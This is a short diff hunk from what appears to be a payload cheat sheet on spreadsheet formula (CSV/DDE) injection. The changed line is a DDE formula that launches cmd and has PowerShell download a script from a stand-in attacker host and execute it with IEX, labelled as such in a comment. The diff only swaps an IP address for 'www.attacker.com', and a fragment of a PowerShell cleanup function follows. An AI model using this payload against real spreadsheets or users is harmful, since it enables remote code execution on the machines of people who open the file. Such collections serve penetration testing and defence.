@@ -50,7 +50,7 @@ Another example to use when the form size is limited
 ------------------------------------------------
 ```
 # Will download powershell from attackers server and execute it
-=cmd|' /C powershell IEX(wget 10.5.21.41/p.ps1)'!A0
+=cmd|' /C powershell IEX(wget www.attacker.com/p.ps1)'!A0
 
 function cleanup {
 if ($client.Connected -eq $true) {$client.Close()}
